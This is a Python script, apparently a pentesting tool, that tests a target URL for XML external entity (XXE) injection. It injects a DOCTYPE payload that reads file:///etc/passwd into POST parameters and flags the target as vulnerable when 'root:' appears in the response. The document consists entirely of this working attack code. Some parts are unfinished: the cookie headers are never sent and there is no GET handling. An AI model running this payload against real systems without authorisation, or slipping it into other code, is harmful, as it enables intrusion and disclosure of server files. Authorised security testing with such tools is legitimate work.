#!/usr/bin/env python

import requests
import argparse
import urllib.parse

payloads = {
    # '<!DOCTYPE foo [<!ENTITY testref "testrefvalue">]': 'testrefvalue',
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>': 'root:'
}


def get_headers_by_cookie(cookie=''):
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0'
    }
    if cookie:
        headers['cookie'] = cookie
    return headers


def join_dict_params(obj={}):
    res = {}
    for key, value in obj.items():
        if type(value) == str:
            res[key] = value
        else:
            res[key] = value[0]
    return urllib.parse.urlencode(res)


def check(args):
    if args.url:
        url = urllib.parse.urlparse(args.url)
        params = ''
        headers = get_headers_by_cookie(args.cookie)
        if args.params:
            params = args.params.split(',')
        if args.data:
            # post
            data = urllib.parse.parse_qs(args.data)
            for param in params or data:
                tmp = data[param]
                for payload in payloads:
                    data[param] = payload + tmp[0].replace('XXxxeXX', '&xxe;')
                    data_str = join_dict_params(data)
                    res = requests.post(args.url, data=data)
                    if res.text.find(payloads[payload]) != -1:
                        print(
                            f'[+] {data_str} vulnerable')
                        break
                data[param] = tmp


def main():
    parser = argparse.ArgumentParser(
        description='Check XXE vulnerability - by myths')
    parser.add_argument('-u', '--url', action='store',
                        default='', help='target url', required=True)
    parser.add_argument('-d', '--data', action='store',
                        default='', help='post data, need XXxxeXX to indetify')
    parser.add_argument('-p', '--params',)
    parser.add_argument('-c', '--cookie', action='store',
                        default='', help='cookie')
    args = parser.parse_args()
    check(args)


if __name__ == '__main__':
    main()
